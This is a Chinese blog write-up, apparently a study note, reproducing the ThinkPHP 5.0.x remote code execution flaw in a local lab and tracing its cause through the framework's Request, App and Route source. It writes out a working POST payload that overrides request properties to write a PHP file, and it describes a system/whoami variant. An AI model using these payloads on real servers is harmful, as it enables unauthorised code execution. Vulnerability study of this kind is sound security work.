{"title":"5.0-5.0.23RCE漏洞复现","uid":"02bb8134dce40015108a5a765c734167","slug":"5-0-5-0-23RCE漏洞","date":"2022-10-19T13:20:47.000Z","updated":"2022-10-19T13:42:05.365Z","comments":true,"path":"api/articles/5-0-5-0-23RCE漏洞.json","keywords":null,"cover":[],"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"参考文章：\"><a href=\"#参考文章：\" class=\"headerlink\" title=\"参考文章：\"></a>参考文章：</h1><p><a href=\"https://mp.weixin.qq.com/s/DGWuSdB2DvJszom0C_dkoQ\">https://mp.weixin.qq.com/s/DGWuSdB2DvJszom0C_dkoQ</a></p>\n<p><a href=\"https://y4tacker.blog.csdn.net/article/details/115893304\">https://y4tacker.blog.csdn.net/article/details/115893304</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/qI10_Wtc1wrcNvAP_MBURQ\">https://mp.weixin.qq.com/s/qI10_Wtc1wrcNvAP_MBURQ</a></p>\n<h1 id=\"复现：\"><a href=\"#复现：\" class=\"headerlink\" title=\"复现：\"></a>复现：</h1><p>环境：tp5.0.6  php5.4.45  </p>\n<p>先直接用Y4tacher的payload刚一波</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">URL地址\nurl&#x2F;public&#x2F;?s&#x3D;captcha&amp;g&#x3D;implode\nPOST数据\npath&#x3D;PD9waHAgZmlsZV9wdXRfY29udGVudHMoJ3k0dGFja2VyLnBocCcsJzw&#x2F;cGhwIHBocGluZm8oKTs&#x2F;PicpOyA&#x2F;Pg&#x3D;&#x3D;&amp;_method&#x3D;__construct&amp;filter[]&#x3D;set_error_handler&amp;filter[]&#x3D;self::path&amp;filter[]&#x3D;base64_decode&amp;filter[]&#x3D;\\think\\view\\driver\\Php::Display&amp;method&#x3D;GET</code></pre>\n\n<p>传过去页面报错，还以为失败了，看目录才发现已经将文件写入进去了</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/38.PNG\"></p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/39.PNG\"></p>\n<p>接下来就是看文章读代码了</p>\n<p>漏洞利用点在thinkphp\\library\\think\\Request.php里的method方法</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&#x2F;**\n     * 当前的请求类型\n     * @access public\n     * @param bool $method  true 获取原始请求类型\n     * @return string\n     *&#x2F;\n    public function method($method &#x3D; false)\n    &#123;\n        if (true &#x3D;&#x3D;&#x3D; $method) &#123;\n            &#x2F;&#x2F; 获取原始请求类型\n            return IS_CLI ? &#39;GET&#39; : (isset($this-&gt;server[&#39;REQUEST_METHOD&#39;]) ? $this-&gt;server[&#39;REQUEST_METHOD&#39;] : $_SERVER[&#39;REQUEST_METHOD&#39;]);\n        &#125; elseif (!$this-&gt;method) &#123;\n            if (isset($_POST[Config::get(&#39;var_method&#39;)])) &#123;\n                $this-&gt;method &#x3D; strtoupper($_POST[Config::get(&#39;var_method&#39;)]);\n                $this-&gt;&#123;$this-&gt;method&#125;($_POST);\n            &#125; elseif (isset($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;])) &#123;\n                $this-&gt;method &#x3D; strtoupper($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;]);\n            &#125; else &#123;\n                $this-&gt;method &#x3D; IS_CLI ? &#39;GET&#39; : (isset($this-&gt;server[&#39;REQUEST_METHOD&#39;]) ? $this-&gt;server[&#39;REQUEST_METHOD&#39;] : $_SERVER[&#39;REQUEST_METHOD&#39;]);\n            &#125;\n        &#125;\n        return $this-&gt;method;\n    &#125;</code></pre>\n\n<p>$method默认为false，会用get方法获取$_POST里的‘var_method’，在config.php里设置为_method参数的值，get函数就是获取内容，没什么营养。然后变成大写，接着就是动态调用类的方法，就是获取到底_method的值作为函数调用，$_POST的值作为参数。所以传入_method=xxx ，就会调用xxx函数，当这个xxx是__construct函数时</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&#x2F;**\n    * 架构函数\n    * @access protected\n    * @param array $options 参数\n    *&#x2F;\n   protected function __construct($options &#x3D; [])\n   &#123;\n       foreach ($options as $name &#x3D;&gt; $item) &#123;\n           if (property_exists($this, $name)) &#123;\n               $this-&gt;$name &#x3D; $item;\n           &#125;\n       &#125;\n       if (is_null($this-&gt;filter)) &#123;\n           $this-&gt;filter &#x3D; Config::get(&#39;default_filter&#39;);\n       &#125;\n       &#x2F;&#x2F; 保存 php:&#x2F;&#x2F;input\n       $this-&gt;input &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);\n   &#125;</code></pre>\n\n<p>先检查这个类里是否有传入的参数相匹配的属性，有就赋值给属性，这就表示可以覆盖里面的所有属性值。之后，检查属性filter的值是否为空，为空则设置为全局默认过滤方法。之后通过input伪协议获取$_POST的内容存放到input属性里面。</p>\n<p><strong>这里能覆盖属性，接着就是要找回调函数，和上个漏洞一样这里也是通过覆盖filter的值，在通过回调函数调用filter过滤时，执行代码。</strong></p>\n<p><strong>这个时候应该是在整个类里找使用filter的地方</strong></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&#x2F;**\n    * 设置或获取当前的过滤规则\n    * @param mixed $filter 过滤规则\n    * @return mixed\n    *&#x2F;\n   public function filter($filter &#x3D; null)\n   &#123;\n       if (is_null($filter)) &#123;\n           return $this-&gt;filter;\n       &#125; else &#123;\n           $this-&gt;filter &#x3D; $filter;\n       &#125;\n   &#125;</code></pre>\n\n<p>filter过滤函数是取得类属性filter</p>\n<p>接着是input函数</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#x2F;**\n     * 获取变量 支持过滤和默认值\n     * @param array         $data 数据源\n     * @param string|false  $name 字段名\n     * @param mixed         $default 默认值\n     * @param string|array  $filter 过滤函数\n     * @return mixed\n     *&#x2F;\n    public function input($data &#x3D; [], $name &#x3D; &#39;&#39;, $default &#x3D; null, $filter &#x3D; &#39;&#39;)\n    &#123;\n        if (false &#x3D;&#x3D;&#x3D; $name) &#123;\n            &#x2F;&#x2F; 获取原始数据\n            return $data;\n        &#125;\n        $name &#x3D; (string) $name;\n        if (&#39;&#39; !&#x3D; $name) &#123;\n            &#x2F;&#x2F; 解析name\n            if (strpos($name, &#39;&#x2F;&#39;)) &#123;\n                list($name, $type) &#x3D; explode(&#39;&#x2F;&#39;, $name);\n            &#125; else &#123;\n                $type &#x3D; &#39;s&#39;;\n            &#125;\n            &#x2F;&#x2F; 按.拆分成多维数组进行判断\n            foreach (explode(&#39;.&#39;, $name) as $val) &#123;\n                if (isset($data[$val])) &#123;\n                    $data &#x3D; $data[$val];\n                &#125; else &#123;\n                    &#x2F;&#x2F; 无输入数据，返回默认值\n                    return $default;\n                &#125;\n            &#125;\n            if (is_object($data)) &#123;\n                return $data;\n            &#125;\n        &#125;\n\n        &#x2F;&#x2F; 解析过滤器\n        if (is_null($filter)) &#123;\n            $filter &#x3D; [];\n        &#125; else &#123;\n            $filter &#x3D; $filter ?: $this-&gt;filter;\n            if (is_string($filter)) &#123;\n                $filter &#x3D; explode(&#39;,&#39;, $filter);\n            &#125; else &#123;\n                $filter &#x3D; (array) $filter;\n            &#125;\n        &#125;\n\n        $filter[] &#x3D; $default;\n        if (is_array($data)) &#123;\n            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);\n            reset($data);\n        &#125; else &#123;\n            $this-&gt;filterValue($data, $name, $filter);\n        &#125;\n\n        if (isset($type) &amp;&amp; $data !&#x3D;&#x3D; $default) &#123;\n            &#x2F;&#x2F; 强制类型转换\n            $this-&gt;typeCast($data, $type);\n        &#125;\n        return $data;\n    &#125;</code></pre>\n\n<p>如果传入的$name恒等于false，就直接返回$data。不是false则将$name的类型转化为string。判断$name是否为空字符串，不是则解析$name，通过/来分开$name。</p>\n<p>之后又通过. 来拆开$name，判断$data里面是否有拆开的$name的值。接着判断$data是不是对象，是就返回$data。</p>\n<p>判断$filter是否为空，不为空就通过</p>\n<p>$filter = $filter ?: $this-&gt;filter;</p>\n<p>这句有点懵逼，反正就是获取类的filter属性。是string就分开，不是string就变为数组</p>\n<p>这怎么后面又  $filter[] = $default; </p>\n<p>还是写个小代码看看，是怎么回事</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nfunction test($filter,$default&#x3D;null)&#123;\n    if (is_null($filter)) &#123;\n        $filter &#x3D; [];\n    &#125; else &#123;\n        if (is_string($filter)) &#123;\n            $filter &#x3D; explode(&#39;,&#39;, $filter);\n        &#125; else &#123;\n            $filter &#x3D; (array) $filter;\n        &#125;\n    &#125;\n\n    $filter[] &#x3D; $default;\n    var_dump($filter);\n&#125;\ntest(&#39;assert&#39;);\n?&gt;\narray(2) &#123; [0]&#x3D;&gt; string(6) &quot;assert&quot; [1]&#x3D;&gt; NULL &#125;</code></pre>\n\n<p>你妹的，原来就是添加到数组的意思</p>\n<p>后面判断$data是否为数组，是的话就通过array_walk_recursive进行过滤，终于到这一步了，通过filterValue进行过滤，$filter作为filterValue的参数。不是数组也通过filterValue过滤。之后就是强转data的类型，返回数据了。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&#x2F;**\n     * 递归过滤给定的值\n     * @param mixed     $value 键值\n     * @param mixed     $key 键名\n     * @param array     $filters 过滤方法+默认值\n     * @return mixed\n     *&#x2F;\n    private function filterValue(&amp;$value, $key, $filters)\n    &#123;\n        $default &#x3D; array_pop($filters);\n        foreach ($filters as $filter) &#123;\n            if (is_callable($filter)) &#123;\n                &#x2F;&#x2F; 调用函数或者方法过滤\n                $value &#x3D; call_user_func($filter, $value);\n            &#125; elseif (is_scalar($value)) &#123;\n                if (strpos($filter, &#39;&#x2F;&#39;)) &#123;\n                    &#x2F;&#x2F; 正则过滤\n                    if (!preg_match($filter, $value)) &#123;\n                        &#x2F;&#x2F; 匹配不成功返回默认值\n                        $value &#x3D; $default;\n                        break;\n                    &#125;\n                &#125; elseif (!empty($filter)) &#123;\n                    &#x2F;&#x2F; filter函数不存在时, 则使用filter_var进行过滤\n                    &#x2F;&#x2F; filter为非整形值时, 调用filter_id取得过滤id\n                    $value &#x3D; filter_var($value, is_int($filter) ? $filter : filter_id($filter));\n                    if (false &#x3D;&#x3D;&#x3D; $value) &#123;\n                        $value &#x3D; $default;\n                        break;\n                    &#125;\n                &#125;\n            &#125;\n        &#125;\n        return $this-&gt;filterExp($value);\n    &#125;</code></pre>\n\n<p>filterValue通过call_user_func进行过滤。参数都可以同method方法来控制。</p>\n<p>现在找用到input函数的地方，哪里用到了</p>\n<p>第一个地方就是param函数了</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&#x2F;**\n     * 获取获取当前请求的参数\n     * @access public\n     * @param string|array  $name 变量名\n     * @param mixed         $default 默认值\n     * @param string|array  $filter 过滤方法\n     * @return mixed\n     *&#x2F;\n    public function param($name &#x3D; &#39;&#39;, $default &#x3D; null, $filter &#x3D; &#39;&#39;)\n    &#123;\n        if (empty($this-&gt;param)) &#123;\n            $method &#x3D; $this-&gt;method(true);\n            &#x2F;&#x2F; 自动获取请求变量\n            switch ($method) &#123;\n                case &#39;POST&#39;:\n                    $vars &#x3D; $this-&gt;post(false);\n                    break;\n                case &#39;PUT&#39;:\n                case &#39;DELETE&#39;:\n                case &#39;PATCH&#39;:\n                    $vars &#x3D; $this-&gt;put(false);\n                    break;\n                default:\n                    $vars &#x3D; [];\n            &#125;\n            &#x2F;&#x2F; 当前请求参数和URL地址中的参数合并\n            $this-&gt;param &#x3D; array_merge($this-&gt;get(false), $vars, $this-&gt;route(false));\n        &#125;\n        if (true &#x3D;&#x3D;&#x3D; $name) &#123;\n            &#x2F;&#x2F; 获取包含文件上传信息的数组\n            $file &#x3D; $this-&gt;file();\n            $data &#x3D; array_merge($this-&gt;param, $file);\n            return $this-&gt;input($data, &#39;&#39;, $default, $filter);\n        &#125;\n        return $this-&gt;input($this-&gt;param, $name, $default, $filter);\n    &#125;\n</code></pre>\n\n<p>判断param属性是否为空，接着调用mthod方法。然后就是获取请求内容，接着调用input方法了。</p>\n<p>开始以为调用的是最下面的input，后面看文章发现，在第一个if判断时，会调用</p>\n<p> // 当前请求参数和URL地址中的参数合并</p>\n<p>​            $this-&gt;param = array_merge($this-&gt;get(false), $vars, $this-&gt;route(false));</p>\n<p>get函数:</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&#x2F;**\n     * 设置获取获取GET参数\n     * @access public\n     * @param string|array  $name 变量名\n     * @param mixed         $default 默认值\n     * @param string|array  $filter 过滤方法\n     * @return mixed\n     *&#x2F;\n    public function get($name &#x3D; &#39;&#39;, $default &#x3D; null, $filter &#x3D; &#39;&#39;)\n    &#123;\n        if (empty($this-&gt;get)) &#123;\n            $this-&gt;get &#x3D; $_GET;\n        &#125;\n        if (is_array($name)) &#123;\n            $this-&gt;param      &#x3D; [];\n            return $this-&gt;get &#x3D; array_merge($this-&gt;get, $name);\n        &#125;\n        return $this-&gt;input($this-&gt;get, $name, $default, $filter);\n    &#125;</code></pre>\n\n<p>而在get函数里面，也会用到input函数。但是在这个get传入了false，在执行到input的时候，会直接返回数据。不会进行下面语句。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">publicfunctioninput($data &#x3D; [], $name &#x3D; &#39;&#39;, $default &#x3D; null, $filter &#x3D; &#39;&#39;)\n  &#123;\n      if (false &#x3D;&#x3D;&#x3D; $name) &#123;\n          &#x2F;&#x2F; 获取原始数据\n          return$data;\n      &#125;</code></pre>\n\n<p>而在后面一个input，传入的name为默认的空字符串，会执行到下面过滤，就会触发命令执行。而且这个$name不是类的属性，只是局部变量，不能通过传入$name进行覆盖。</p>\n<p>所以，第一个参考链接里，启明星辰那篇文章应该写错了，为了防止判断错误，直接脚本验证</p>\n<p>当然没有动态调式过，可能分析有错</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nfunction get($name&#x3D;&#39;&#39;,$default &#x3D; null, $filter &#x3D; &#39;&#39;)&#123;\n    $default&#x3D; &#39;&#39;;\n    $filter&#x3D;&#39;&#39;;\n    return test1($name,1);\n&#125;\nfunction test1($name&#x3D;&#39;&#39;,$data)&#123;\n    if(false&#x3D;&#x3D;&#x3D;$name)&#123;\n        return $data;\n    &#125;\n    return $data+1;\n&#125;\necho get(false).&#39;&lt;&#x2F;br&gt;&#39;;\necho get();\n?&gt;</code></pre>\n\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/41.PNG\"></p>\n<p>上面就是通过method来代码执行的链</p>\n<p><strong>所以需要先用method函数修改属性值，接着利用param函数来执行代码</strong>，到这里就懵逼了，直接看文章怎么用的</p>\n<h2 id=\"第一个payload：\"><a href=\"#第一个payload：\" class=\"headerlink\" title=\"第一个payload：\"></a>第一个payload：</h2><p>简单</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/40.PNG\"></p>\n<p>直接post提交参数就行了，关键是原理是啥呢？</p>\n<p>看入口文件怎么写的，包含start.php，在使用App的run函数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&#x2F;**\n     * 执行应用程序\n     * @access public\n     * @param Request $request Request对象\n     * @return Response\n     * @throws Exception\n     *&#x2F;\n    public static function run(Request $request &#x3D; null)\n    &#123;\n        is_null($request) &amp;&amp; $request &#x3D; Request::instance();\n\n        try &#123;\n            $config &#x3D; self::initCommon();\n            if (defined(&#39;BIND_MODULE&#39;)) &#123;\n                &#x2F;&#x2F; 模块&#x2F;控制器绑定\n                BIND_MODULE &amp;&amp; Route::bind(BIND_MODULE);\n            &#125; elseif ($config[&#39;auto_bind_module&#39;]) &#123;\n                &#x2F;&#x2F; 入口自动绑定\n                $name &#x3D; pathinfo($request-&gt;baseFile(), PATHINFO_FILENAME);\n                if ($name &amp;&amp; &#39;index&#39; !&#x3D; $name &amp;&amp; is_dir(APP_PATH . $name)) &#123;\n                    Route::bind($name);\n                &#125;\n            &#125;\n\n            $request-&gt;filter($config[&#39;default_filter&#39;]);\n\n            if ($config[&#39;lang_switch_on&#39;]) &#123;\n                &#x2F;&#x2F; 开启多语言机制 检测当前语言\n                Lang::detect();\n            &#125; else &#123;\n                &#x2F;&#x2F; 读取默认语言\n                Lang::range($config[&#39;default_lang&#39;]);\n            &#125;\n            $request-&gt;langset(Lang::range());\n            &#x2F;&#x2F; 加载系统语言包\n            Lang::load([\n                THINK_PATH . &#39;lang&#39; . DS . $request-&gt;langset() . EXT,\n                APP_PATH . &#39;lang&#39; . DS . $request-&gt;langset() . EXT,\n            ]);\n\n            &#x2F;&#x2F; 获取应用调度信息\n            $dispatch &#x3D; self::$dispatch;\n            if (empty($dispatch)) &#123;\n                &#x2F;&#x2F; 进行URL路由检测\n                $dispatch &#x3D; self::routeCheck($request, $config);\n            &#125;\n            &#x2F;&#x2F; 记录当前调度信息\n            $request-&gt;dispatch($dispatch);\n\n            &#x2F;&#x2F; 记录路由和请求信息\n            if (self::$debug) &#123;\n                Log::record(&#39;[ ROUTE ] &#39; . var_export($dispatch, true), &#39;info&#39;);\n                Log::record(&#39;[ HEADER ] &#39; . var_export($request-&gt;header(), true), &#39;info&#39;);\n                Log::record(&#39;[ PARAM ] &#39; . var_export($request-&gt;param(), true), &#39;info&#39;);\n            &#125;\n\n            &#x2F;&#x2F; 监听app_begin\n            Hook::listen(&#39;app_begin&#39;, $dispatch);\n            &#x2F;&#x2F; 请求缓存检查\n            $request-&gt;cache($config[&#39;request_cache&#39;], $config[&#39;request_cache_expire&#39;], $config[&#39;request_cache_except&#39;]);\n\n            switch ($dispatch[&#39;type&#39;]) &#123;\n                case &#39;redirect&#39;:\n                    &#x2F;&#x2F; 执行重定向跳转\n                    $data &#x3D; Response::create($dispatch[&#39;url&#39;], &#39;redirect&#39;)-&gt;code($dispatch[&#39;status&#39;]);\n                    break;\n                case &#39;module&#39;:\n                    &#x2F;&#x2F; 模块&#x2F;控制器&#x2F;操作\n                    $data &#x3D; self::module($dispatch[&#39;module&#39;], $config, isset($dispatch[&#39;convert&#39;]) ? $dispatch[&#39;convert&#39;] : null);\n                    break;\n                case &#39;controller&#39;:\n                    &#x2F;&#x2F; 执行控制器操作\n                    $vars &#x3D; array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);\n                    $data &#x3D; Loader::action($dispatch[&#39;controller&#39;], $vars, $config[&#39;url_controller_layer&#39;], $config[&#39;controller_suffix&#39;]);\n                    break;\n                case &#39;method&#39;:\n                    &#x2F;&#x2F; 执行回调方法\n                    $vars &#x3D; array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);\n                    $data &#x3D; self::invokeMethod($dispatch[&#39;method&#39;], $vars);\n                    break;\n                case &#39;function&#39;:\n                    &#x2F;&#x2F; 执行闭包\n                    $data &#x3D; self::invokeFunction($dispatch[&#39;function&#39;]);\n                    break;\n                case &#39;response&#39;:\n                    $data &#x3D; $dispatch[&#39;response&#39;];\n                    break;\n                default:\n                    throw new \\InvalidArgumentException(&#39;dispatch type not support&#39;);\n            &#125;\n        &#125; catch (HttpResponseException $exception) &#123;\n            $data &#x3D; $exception-&gt;getResponse();\n        &#125;\n\n        &#x2F;&#x2F; 清空类的实例化\n        Loader::clearInstance();\n\n        &#x2F;&#x2F; 输出数据到客户端\n        if ($data instanceof Response) &#123;\n            $response &#x3D; $data;\n        &#125; elseif (!is_null($data)) &#123;\n            &#x2F;&#x2F; 默认自动识别响应输出类型\n            $isAjax   &#x3D; $request-&gt;isAjax();\n            $type     &#x3D; $isAjax ? Config::get(&#39;default_ajax_return&#39;) : Config::get(&#39;default_return_type&#39;);\n            $response &#x3D; Response::create($data, $type);\n        &#125; else &#123;\n            $response &#x3D; Response::create();\n        &#125;\n\n        &#x2F;&#x2F; 监听app_end\n        Hook::listen(&#39;app_end&#39;, $response);\n\n        return $response;\n    &#125;</code></pre>\n\n<p>很长，前面就是处理，到判断$dispatch才是重点</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&#x2F;&#x2F; 获取应用调度信息\n           $dispatch &#x3D; self::$dispatch;\n           if (empty($dispatch)) &#123;\n               &#x2F;&#x2F; 进行URL路由检测\n               $dispatch &#x3D; self::routeCheck($request, $config);\n           &#125;\n           &#x2F;&#x2F; 记录当前调度信息\n           $request-&gt;dispatch($dispatch);</code></pre>\n\n<p>使用routeCheck检查</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&#x2F;**\n     * URL路由检测（根据PATH_INFO)\n     * @access public\n     * @param  \\think\\Request $request\n     * @param  array          $config\n     * @return array\n     * @throws \\think\\Exception\n     *&#x2F;\n    public static function routeCheck($request, array $config)\n    &#123;\n        $path   &#x3D; $request-&gt;path();\n        $depr   &#x3D; $config[&#39;pathinfo_depr&#39;];\n        $result &#x3D; false;\n        &#x2F;&#x2F; 路由检测\n        $check &#x3D; !is_null(self::$routeCheck) ? self::$routeCheck : $config[&#39;url_route_on&#39;];\n        if ($check) &#123;\n            &#x2F;&#x2F; 开启路由\n            if (is_file(RUNTIME_PATH . &#39;route.php&#39;)) &#123;\n                &#x2F;&#x2F; 读取路由缓存\n                $rules &#x3D; include RUNTIME_PATH . &#39;route.php&#39;;\n                if (is_array($rules)) &#123;\n                    Route::rules($rules);\n                &#125;\n            &#125; else &#123;\n                $files &#x3D; $config[&#39;route_config_file&#39;];\n                foreach ($files as $file) &#123;\n                    if (is_file(CONF_PATH . $file . CONF_EXT)) &#123;\n                        &#x2F;&#x2F; 导入路由配置\n                        $rules &#x3D; include CONF_PATH . $file . CONF_EXT;\n                        if (is_array($rules)) &#123;\n                            Route::import($rules);\n                        &#125;\n                    &#125;\n                &#125;\n            &#125;\n\n            &#x2F;&#x2F; 路由检测（根据路由定义返回不同的URL调度）\n            $result &#x3D; Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);\n            $must   &#x3D; !is_null(self::$routeMust) ? self::$routeMust : $config[&#39;url_route_must&#39;];\n            if ($must &amp;&amp; false &#x3D;&#x3D;&#x3D; $result) &#123;\n                &#x2F;&#x2F; 路由无效\n                throw new RouteNotFoundException();\n            &#125;\n        &#125;\n        if (false &#x3D;&#x3D;&#x3D; $result) &#123;\n            &#x2F;&#x2F; 路由无效 解析模块&#x2F;控制器&#x2F;操作&#x2F;参数... 支持控制器自动搜索\n            $result &#x3D; Route::parseUrl($path, $depr, $config[&#39;controller_auto_search&#39;]);\n        &#125;\n        return $result;\n    &#125;\n</code></pre>\n\n<p>一堆处理，直到使用check函数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&#x2F;**\n     * 检测URL路由\n     * @access public\n     * @param Request   $request Request请求对象\n     * @param string    $url URL地址\n     * @param string    $depr URL分隔符\n     * @param bool      $checkDomain 是否检测域名规则\n     * @return false|array\n     *&#x2F;\n    public static function check($request, $url, $depr &#x3D; &#39;&#x2F;&#39;, $checkDomain &#x3D; false)\n    &#123;\n        &#x2F;&#x2F; 分隔符替换 确保路由定义使用统一的分隔符\n        $url &#x3D; str_replace($depr, &#39;|&#39;, $url);\n\n        if (strpos($url, &#39;|&#39;) &amp;&amp; isset(self::$rules[&#39;alias&#39;][strstr($url, &#39;|&#39;, true)])) &#123;\n            &#x2F;&#x2F; 检测路由别名\n            $result &#x3D; self::checkRouteAlias($request, $url, $depr);\n            if (false !&#x3D;&#x3D; $result) &#123;\n                return $result;\n            &#125;\n        &#125;\n        $method &#x3D; strtolower($request-&gt;method());\n        &#x2F;&#x2F; 获取当前请求类型的路由规则\n        $rules &#x3D; self::$rules[$method];\n        &#x2F;&#x2F; 检测域名部署\n        if ($checkDomain) &#123;\n            self::checkDomain($request, $rules, $method);\n        &#125;\n        &#x2F;&#x2F; 检测URL绑定\n        $return &#x3D; self::checkUrlBind($url, $rules, $depr);\n        if (false !&#x3D;&#x3D; $return) &#123;\n            return $return;\n        &#125;\n        if (&#39;|&#39; !&#x3D; $url) &#123;\n            $url &#x3D; rtrim($url, &#39;|&#39;);\n        &#125;\n        $item &#x3D; str_replace(&#39;|&#39;, &#39;&#x2F;&#39;, $url);\n        if (isset($rules[$item])) &#123;\n            &#x2F;&#x2F; 静态路由规则检测\n            $rule &#x3D; $rules[$item];\n            if (true &#x3D;&#x3D;&#x3D; $rule) &#123;\n                $rule &#x3D; self::getRouteExpress($item);\n            &#125;\n            if (!empty($rule[&#39;route&#39;]) &amp;&amp; self::checkOption($rule[&#39;option&#39;], $request)) &#123;\n                self::setOption($rule[&#39;option&#39;]);\n                return self::parseRule($item, $rule[&#39;route&#39;], $url, $rule[&#39;option&#39;]);\n            &#125;\n        &#125;\n\n        &#x2F;&#x2F; 路由规则检测\n        if (!empty($rules)) &#123;\n            return self::checkRoute($request, $rules, $url, $depr);\n        &#125;\n        return false;\n    &#125;\n\n    private static function getRouteExpress($key)\n    &#123;\n        return self::$domainRule ? self::$domainRule[&#39;*&#39;][$key] : self::$rules[&#39;*&#39;][$key];\n    &#125;\n</code></pre>\n\n<p>第一个if不用看，下面直接调用最开始实例化的request对象的method方法</p>\n<p>这个request对象是在run方法开始的时候实例化的</p>\n<p>method为false，直接通过</p>\n<p>$this-&gt;method = strtoupper($_POST[Config::get(‘var_method’)]);</p>\n<p>​                $this-&gt;{$this-&gt;method}($_POST);</p>\n<p>获取_method的值，动态调用，所以传入的_method=__construct</p>\n<p>赋值给$method和$filter</p>\n<p>直到回到run函数，继续往下走，就会执行到param函数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&#x2F;&#x2F; 获取应用调度信息\n            $dispatch &#x3D; self::$dispatch;\n            if (empty($dispatch)) &#123;\n                &#x2F;&#x2F; 进行URL路由检测\n                $dispatch &#x3D; self::routeCheck($request, $config);\n            &#125;\n            &#x2F;&#x2F; 记录当前调度信息\n            $request-&gt;dispatch($dispatch);\n\n            &#x2F;&#x2F; 记录路由和请求信息\n            if (self::$debug) &#123;\n                Log::record(&#39;[ ROUTE ] &#39; . var_export($dispatch, true), &#39;info&#39;);\n                Log::record(&#39;[ HEADER ] &#39; . var_export($request-&gt;header(), true), &#39;info&#39;);\n                Log::record(&#39;[ PARAM ] &#39; . var_export($request-&gt;param(), true), &#39;info&#39;);\n            &#125;</code></pre>\n\n<p>走到下面这个if判断的时候，获取$debug属性值，默认ture。所以就会走到</p>\n<p>Log::record(‘[ PARAM ] ‘.var_export($request-&gt;param(), true), ‘info’);</p>\n<p>这个时候就完成了命令执行的第二步，获取POST的数据<strong>whoami</strong>放到$var里面，最后是$data里，前面设置了$filter为<strong>system，</strong>最后通过call_user_func来执行命令。</p>\n<p>如果没有开启<strong>debug模式</strong>，就不会到达第二步触发命令执行。所以，这个洞才强调需要开启debug模式才行。</p>\n<h2 id=\"第二个payload：\"><a href=\"#第二个payload：\" class=\"headerlink\" title=\"第二个payload：\"></a>第二个payload：</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">URL地址\nurl&#x2F;public&#x2F;?s&#x3D;captcha&amp;g&#x3D;implode\nPOST数据\npath&#x3D;PD9waHAgZmlsZV9wdXRfY29udGVudHMoJ3k0dGFja2VyLnBocCcsJzw&#x2F;cGhwIHBocGluZm8oKTs&#x2F;PicpOyA&#x2F;Pg&#x3D;&#x3D;&amp;_method&#x3D;__construct&amp;filter[]&#x3D;set_error_handler&amp;filter[]&#x3D;self::path&amp;filter[]&#x3D;base64_decode&amp;filter[]&#x3D;\\think\\view\\driver\\Php::Display&amp;method&#x3D;GET</code></pre>\n\n<p>这个也是y4tacker文章中使用的payload，用到一个特性，在特定条件下，可以通过::调用非静态方法</p>\n<p>这个payload触发param的地方，在于将$dispatch[‘type’]的值设置为method，通过switch，调用param函数。具体理解看下面了：</p>\n<p>看一下这个payload，先是路由?s=captcha&amp;g=implode，接着POST传入了一段base64编码的php语句，_mehtod属性为__construct方法，传入的$filter[]有多个，和method为GET</p>\n<p>不了解路由有什么用，看下文章。文中说传入captcha是为了获取路由</p>\n<p>很尴尬，我这个5.0.6版本的tp没有captcha。我尝试去掉captcha，只留下implode发现也能写入成功，同时页面也就没有了captcha模块不存在的错误。</p>\n<p>这个implode就是使用implode模块的意思，前面的g可以换成任意字母</p>\n<p>同时页面报错implode最多需要两个参数，传入了五个，这是不是表示implode是函数的意思。基础不牢地动天摇，你妹的，这是php内置函数，作用是字符串连接数组的</p>\n<p>先进入run方法，之后if判断$dispatch为空则进入routeCheck方法</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&#x2F;**\n     * URL路由检测（根据PATH_INFO)\n     * @access public\n     * @param  \\think\\Request $request\n     * @param  array          $config\n     * @return array\n     * @throws \\think\\Exception\n     *&#x2F;\n    public static function routeCheck($request, array $config)\n    &#123;\n        $path   &#x3D; $request-&gt;path();\n        $depr   &#x3D; $config[&#39;pathinfo_depr&#39;];\n        $result &#x3D; false;\n        &#x2F;&#x2F; 路由检测\n        $check &#x3D; !is_null(self::$routeCheck) ? self::$routeCheck : $config[&#39;url_route_on&#39;];\n        if ($check) &#123;\n            &#x2F;&#x2F; 开启路由\n            if (is_file(RUNTIME_PATH . &#39;route.php&#39;)) &#123;\n                &#x2F;&#x2F; 读取路由缓存\n                $rules &#x3D; include RUNTIME_PATH . &#39;route.php&#39;;\n                if (is_array($rules)) &#123;\n                    Route::rules($rules);\n                &#125;\n            &#125; else &#123;\n                $files &#x3D; 